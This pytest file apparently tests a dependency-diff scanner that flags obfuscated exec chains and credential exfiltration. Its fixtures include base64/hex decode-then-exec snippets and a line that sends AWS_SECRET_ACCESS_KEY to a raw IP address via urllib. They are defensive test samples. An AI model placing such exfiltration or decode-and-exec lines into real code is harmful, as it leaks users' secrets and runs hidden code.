"""Tests for window-based multi-line pattern detection."""

import pytest
from depvet.analyzer.rules import (
    scan_diff_full,
    scan_diff_windowed,
)
from depvet.models.verdict import Severity


def make_diff(lines: list[str], filepath: str = "test.py") -> str:
    header = [f"--- a/{filepath}", f"+++ b/{filepath}", "@@ -1,1 +1,{len(lines)} @@"]
    return "\n".join(header + [f"+{line}" for line in lines])


# ─── BASE64_EXEC_CHAIN ────────────────────────────────────────────────────────

def test_window_base64_exec_chain_critical():
    """base64 decode + exec within 3 lines → CRITICAL window match."""
    diff = make_diff([
        "data = base64.b64decode('aGVsbG8=')",
        "code = compile(data, '<s>', 'exec')",
        "exec(code)",
    ])
    matches = scan_diff_windowed(diff, "setup.py")
    ids = [m.rule_id for m in matches]
    assert "BASE64_EXEC_CHAIN" in ids
    chain = next(m for m in matches if m.rule_id == "BASE64_EXEC_CHAIN")
    assert chain.severity == Severity.CRITICAL


def test_window_base64_alone_no_chain():
    """base64 decode without exec does NOT trigger window CRITICAL."""
    diff = make_diff([
        "data = base64.b64decode(encoded)",
        "result = data.decode('utf-8')",
        "print(result)",
    ])
    matches = scan_diff_windowed(diff)
    chain_ids = [m.rule_id for m in matches if m.rule_id == "BASE64_EXEC_CHAIN"]
    assert not chain_ids


def test_window_base64_exec_too_far_apart():
    """base64 and exec more than 5 lines apart → no window match."""
    lines = ["data = base64.b64decode('x')"] + ["pass"] * 10 + ["exec('x')"]
    diff = make_diff(lines)
    matches = scan_diff_windowed(diff)
    chain_ids = [m.rule_id for m in matches if m.rule_id == "BASE64_EXEC_CHAIN"]
    assert not chain_ids


# ─── ENV_EXFIL_CHAIN ──────────────────────────────────────────────────────────

def test_window_env_exfil_chain():
    """os.environ read + urllib.request within 8 lines → CRITICAL."""
    diff = make_diff([
        "import urllib.request",
        "key = os.environ.get('AWS_SECRET_ACCESS_KEY')",
        "req = urllib.request.Request('http://1.2.3.4/', data=key.encode())",
        "urllib.request.urlopen(req)",
    ])
    matches = scan_diff_windowed(diff, "__init__.py")
    assert any(m.rule_id == "ENV_EXFIL_CHAIN" for m in matches)
    chain = next(m for m in matches if m.rule_id == "ENV_EXFIL_CHAIN")
    assert chain.severity == Severity.CRITICAL


def test_window_env_read_without_network_no_chain():
    """os.environ read without network call → no exfil chain."""
    diff = make_diff([
        "key = os.environ.get('API_KEY')",
        "if not key:",
        "    raise ValueError('missing key')",
    ])
    matches = scan_diff_windowed(diff)
    assert not any(m.rule_id == "ENV_EXFIL_CHAIN" for m in matches)


# ─── NPM_HEX_EXEC ─────────────────────────────────────────────────────────────

def test_window_npm_hex_exec():
    """Buffer.from hex + eval → CRITICAL."""
    diff = make_diff([
        "const _x = Buffer.from('636f6e736f6c65', 'hex').toString();",
        "eval(_x);",
    ], filepath="index.js")
    matches = scan_diff_windowed(diff, "index.js")
    assert any(m.rule_id == "NPM_HEX_EXEC" for m in matches)


# ─── scan_diff_full dedup ─────────────────────────────────────────────────────

def test_full_scan_deduplicates():
    """scan_diff_full should not have duplicate rule_id+line matches."""
    diff = make_diff([
        "data = base64.b64decode('x')",
        "exec(data)",
    ], filepath="setup.py")
    matches = scan_diff_full(diff, "setup.py")
    # Check no exact (rule_id, line) duplicates
    seen = set()
    for m in matches:
        key = (m.rule_id, m.line_number)
        assert key not in seen, f"Duplicate match: {key}"
        seen.add(key)


def test_full_scan_window_critical_suppresses_lower_single():
    """If window finds CRITICAL for a category, lower single-line hits in same category are removed."""
    diff = make_diff([
        "import base64",
        "data = base64.b64decode('aGVsbG8=')",  # single: BASE64_DECODE_EXEC=HIGH
        "code = compile(data, '<s>', 'exec')",
        "exec(code)",                           # window: BASE64_EXEC_CHAIN=CRITICAL
    ], filepath="setup.py")
    matches = scan_diff_full(diff, "setup.py")
    # OBFUSCATION category: CRITICAL chain present, MEDIUM single-line should be suppressed
    obf_matches = [m for m in matches if m.category.value == "OBFUSCATION"]
    severities = {m.severity.value for m in obf_matches}
    # Should have CRITICAL but not MEDIUM in OBFUSCATION (LOW/MEDIUM suppressed)
    assert "CRITICAL" in severities
    assert "MEDIUM" not in severities


# ─── DiffStats signals ────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_diff_stats_large_addition_signal():
    from depvet.analyzer.version_signal import analyze_diff_stats_signals
    from depvet.models.verdict import DiffStats

    stats = DiffStats(
        files_changed=3, lines_added=500, lines_removed=10,
        binary_files=[], new_files=[], deleted_files=[]
    )
    signals = await analyze_diff_stats_signals(stats, "mypkg", "pypi")
    ids = [s.signal_id for s in signals]
    assert "LARGE_ADDITION" in ids or "PURE_ADDITION" in ids


@pytest.mark.asyncio
async def test_diff_stats_binary_added_signal():
    from depvet.analyzer.version_signal import analyze_diff_stats_signals
    from depvet.models.verdict import DiffStats

    stats = DiffStats(
        files_changed=2, lines_added=10, lines_removed=5,
        binary_files=["lib/evil.so"], new_files=[], deleted_files=[]
    )
    signals = await analyze_diff_stats_signals(stats, "mypkg", "pypi")
    assert any(s.signal_id == "BINARY_ADDED" for s in signals)


@pytest.mark.asyncio
async def test_diff_stats_tests_deleted_signal():
    from depvet.analyzer.version_signal import analyze_diff_stats_signals
    from depvet.models.verdict import DiffStats

    stats = DiffStats(
        files_changed=5, lines_added=100, lines_removed=200,
        binary_files=[], new_files=[],
        deleted_files=["tests/test_auth.py", "tests/test_utils.py", "test_main.py"]
    )
    signals = await analyze_diff_stats_signals(stats, "mypkg", "pypi")
    assert any(s.signal_id == "TESTS_DELETED" for s in signals)


@pytest.mark.asyncio
async def test_diff_stats_no_signals_for_normal_change():
    from depvet.analyzer.version_signal import analyze_diff_stats_signals
    from depvet.models.verdict import DiffStats

    stats = DiffStats(
        files_changed=2, lines_added=15, lines_removed=10,
        binary_files=[], new_files=[], deleted_files=[]
    )
    signals = await analyze_diff_stats_signals(stats, "requests", "pypi")
    # Normal change should have no signals
    assert not signals


# ─── Security package dormancy ────────────────────────────────────────────────

def test_security_package_detection():
    from depvet.analyzer.version_signal import _is_security_package
    assert _is_security_package("cryptography") is True
    assert _is_security_package("bcrypt") is True
    assert _is_security_package("pycryptodome") is True  # contains 'crypto'
    assert _is_security_package("requests") is False
    assert _is_security_package("flask") is False
